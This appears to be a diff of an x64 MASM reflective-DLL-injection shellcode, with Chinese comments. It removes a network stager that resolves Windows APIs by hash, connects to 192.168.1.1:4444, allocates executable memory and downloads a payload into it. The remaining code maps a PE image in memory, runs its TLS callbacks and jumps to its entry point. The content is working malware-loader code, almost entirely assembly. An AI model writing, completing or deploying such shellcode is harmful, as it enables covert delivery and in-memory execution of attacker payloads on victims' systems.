@@ -3,101 +3,10 @@
 ; Language: MASM
 ; Details: front-style RDI shellcode
 ;----------------------------------------------------------------------------------
+
 .code
 
 main proc
-	
-	; 1. 清除方向标志并对齐栈指针，确保符合Windows x64调用约定
-	cld													
-							
-	; 保存非易失性寄存器
-	push rbx
-	push rbp
-	push rsi
-	push rdi
-	push r12
-	push r13
-	push r14
-	push r15
-
-	; [rbp+8] = 旧DOS头地址（基址）
-	; [rbp+16] = 新DOS头地址（基址）
-	; [rbp+24] = 新PE头地址
-	mov rbp,rsp
-	sub rsp,24
-
-	; 2.加载ws2_32.dll库
-	push 0													; 为了对齐
-	mov rax, '23_2sw'										; 构造字符串'ws2_32\0'
-	push rax												; 将字符串压栈，此时RSP指向"ws2_32\0"的地址
-	mov rcx, rsp											; RCX = 字符串地址，作为LoadLibraryA的参数
-	mov r10, 56590AE9h										; kernel32.dll+LoadLibraryA的哈希值
-	call GetProcAddressByHash
-
-	; 3.调用WSAStartup函数
-	sub rsp, 400+8											; WSAData结构体大小400字节，8个字节对齐
-	mov r13,rsp												; R13保存WSAData结构指针
-	mov r12,0101A8C05C110002h								; 构造sockaddr_in结构：192.168.1.1:4444, AF_INET
-	push r12												; 压栈保存sockaddr_in结构
-	mov r12,rsp												; R12保存sockaddr_in结构指针
-	mov rdx,r13												; RDX = WSAData结构指针
-	push 0101h												; Winsock 1.1版本
-	pop rcx													; RCX = 0101h
-	mov r10,4645344Ch										; ws2_32.dll+WSAStartup的哈希值
-	call GetProcAddressByHash
-	
-	test eax,eax
-	jnz failure
-
-	; 4.调用WSASocketA函数
-	mov rcx,2												; af=AF_INET (IPv4)
-	mov rdx,1												; af=SOCK_STREAM (TCP)
-	xor r8,r8												; protocol = 0 (默认)
-	xor r9,r9												; lpProtocolInfo = NULL
-	push r9													; dwFlags = 0
-	push r9													; g=0
-	mov r10,0B83D505Ah										; ws2_32.dll+WSASocketA的哈希值
-	call GetProcAddressByHash
-	xchg rdi,rax											; 保存套接字句柄到RDI
-
-	; 6.调用connect函数
-	mov rcx,rdi												; 套接字句柄
-	mov rdx,r12												; sockaddr_in结构指针
-	push 16													; sockaddr_in结构长度
-	pop r8													; R8 = 16
-	mov r10,6AF3406Dh										; ws2_32.dll+connect的哈希值
-	call GetProcAddressByHash
-
-	test eax,eax						
-	jnz failure
-
-	; 7. 清栈
-	add rsp, ((400+8)+(5*8)+(4*32))
-
-	; 8.调用VirtualAlloc分配内存空间用于存储Shellcode
-	xor rcx, rcx                    						; lpAddress = NULL（由系统选择地址）
-	mov rdx, 00400000h              						; dwSize = 4MB（分配内存大小）
-	mov r8, 1000h                   						; flAllocationType = MEM_COMMIT（提交物理内存）
-	mov r9, 40h                     						; flProtect = PAGE_EXECUTE_READWRITE（可读可写可执行）
-	mov r10, 0FBFA86AFh             						; kernel32.dll+VirtualAlloc 的哈希值
-	call GetProcAddressByHash
-	add rsp,32
-
-read_pre:
-	xchg rax,rbx											; RBX = 分配的内存基地址
-	mov qword ptr [rbp+8],rbx								; 保存基地址
-read_more:
-	mov rcx,rdi												; 套接字句柄
-	mov rdx,rbx												; 当前写入指针
-	mov r8,8192												; 每次读取8192字节
-	xor r9,r9												; flags = 0
-	mov r10,0F1606037h										; ws2_32.dll+recv的哈希值
-	call GetProcAddressByHash
-	add rsp, 32												; 清理影子空间
-
-	add rbx,rax												; 移动写入指针
-	test eax,eax											; 检查接收字节数
-	jnz read_more											; 继续接收直到返回0
 	
 ;-------------------------------------------------------------------
 ; [rbp+8] = 旧DOS头地址（基址）
@@ -105,6 +14,8 @@ read_more:
 ; [rbp+24] = 新NT头地址
 ; LoadPEIntoMemory64
 ;-------------------------------------------------------------------
+	push rax												; 对齐
+
     ; 获取 SizeOfImage
     mov rax, [rbp+8]										; 旧DOS头地址
     mov r12d, dword ptr [rax+3Ch]							; PE头RVA（原文件）
@@ -372,46 +283,29 @@ get_next_tlscallback:
 ; GoToEntry
 ;-------------------------------------------------------------------
 entry:
-	mov  rsi, [rbp+24]										; 获取PE头地址
-	mov  ax, word ptr [rsi+16h]								; 读取Characteristics字段
-	test ax, 2000h											; 检查是否为DLL (0x2000)
-	jz   is_exe												; 非DLL则跳转EXE处理
+	mov  rsi, [rbp+24]					; 获取PE头地址
+	mov  ax, word ptr [rsi+16h]			; 读取Characteristics字段
+	test ax, 2000h						; 检查是否为DLL (0x2000)
+	jz   is_exe							; 非DLL则跳转EXE处理
 
 	sub rsp,32
-	mov ebx,dword ptr [rsi + 28h]							; 调用DLL入口点 RVA
-	add rbx,[rbp+16]										; 调用DLL入口点 VA
+	mov ebx,dword ptr [rsi + 28h]		; 调用DLL入口点 RVA
+	add rbx,[rbp+16]					; 调用DLL入口点 VA
 	mov rcx,[rbp+16]
 	mov rdx,1
 	xor r8d,r8d
 	call rbx
 
-	add rsp,32
-	jmp restore
+	add rsp,40
+	ret
 
 is_exe:
-	mov ebx,dword ptr [rsi + 28h]							; 调用EXE入口点 RVA
-	add rbx,[rbp+16]										; 调用EXE入口点 VA
+	mov ebx,dword ptr [rsi + 28h]		; 调用EXE入口点 RVA
+	add rbx,[rbp+16]					; 调用EXE入口点 VA
 	call rbx
-
-
-;-------------------------------------------------------------------
-; 恢复到调用ReflectiveLoader之前的栈空间和寄存器状态
-;-------------------------------------------------------------------
-restore:
-	add rsp,24
-	pop r15
-	pop r14
-	pop r13
-	pop r12
-	pop rdi
-	pop rsi
-	pop rbp
-	pop rbx
-	ret 
-
-failure:
-	mov r10,0DE2D94D9h
-	call GetProcAddressByHash
+	pop rax								; 清除对齐值
+	ret
+	
 main endp
 
 GetProcAddressByHash proc
